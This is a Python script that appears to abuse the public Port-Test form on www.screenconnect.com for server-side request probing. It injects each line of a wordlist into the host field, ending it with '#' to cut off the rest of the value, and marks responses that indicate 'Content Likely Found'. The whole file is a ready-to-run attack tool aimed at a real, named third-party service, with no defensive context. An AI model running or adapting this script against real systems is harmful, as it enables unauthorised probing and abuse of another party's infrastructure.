import requests
import re

def submit_post_request(line):
    url = "https://www.screenconnect.com/Port-Test"
    web_server_host = "www.screenconnect.com/" + line + "#"
    print(web_server_host)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Te": "trailers"
    }
    data = {
        "__VIEWSTATE": "",
        "__VIEWSTATEGENERATOR": "",
        "ctl00%24Main%24webServerHostBox": web_server_host,
        "ctl00%24Main%24webServerPortBox": 80,
        "ctl00%24Main%24relayHostBox": "",
        "ctl00%24Main%24relayPortBox": 80,
        "ctl00%24Main%24ctl01": "Test Ports"
    }
    response = requests.post(url, headers=headers, data=data)
    print(response.text)
    return response.text

def parse_response(response_text):
    if "Succeeded</font>" in response_text:
        print("Content Likely Found")
        return
    if "style=\"color:Red;\">" in response_text:
        print("Code Received - Interesting Response")
        return

def main():
    with open("content.txt", "r") as f:
        for line in f:
            line = line.strip()
            response_text = submit_post_request(line)
            print("Submitted Text: ", line)
            parse_response(response_text)
            

if __name__ == "__main__":
    main()
